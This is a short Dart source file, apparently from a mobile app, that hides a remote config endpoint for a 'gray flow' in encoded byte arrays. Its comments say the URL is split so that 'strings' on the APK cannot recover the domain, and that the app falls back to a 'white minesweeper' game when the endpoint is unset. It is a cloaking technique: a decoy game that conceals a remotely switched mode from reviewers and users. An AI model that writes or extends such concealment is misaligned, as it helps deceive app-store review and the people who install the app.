import '../cipher/sigil_codec.dart';

// ────────────────────────────────────────────────────────────
// portal_beacon.dart — config endpoint used by the gray flow.
//
// The URL is intentionally split into two independently encoded
// byte spans so `strings <apk>` can never reconstruct the full
// domain in a single pass.
// ────────────────────────────────────────────────────────────

const List<int> _beaconHost = <int>[
  0x16, 0x7B, 0xA1, 0xB9, 0x53, 0x79, 0x0A, 0x57, 0xD1, 0x83, 0xA0, 0x4E,
  0xA4, 0x47, 0x82, 0xBA, 0x1D, 0x45, 0xC5, 0xB4, 0x4A, 0xD6, 0x09, 0x1D,
  0xA6, 0x81,
];

const List<int> _beaconPath = <int>[
  0x51, 0x6C, 0xBA, 0xA7, 0x46, 0x2A, 0x42, 0x56, 0xD1, 0x92, 0xA2,
];

/// Returns the concatenated full endpoint. Empty when the arrays
/// above have never been filled in — the app then falls back to the
/// white minesweeper without ever hitting the network.
String openBeacon() {
  final host = unveil(_beaconHost);
  if (host.isEmpty) return '';
  return host + unveil(_beaconPath);
}
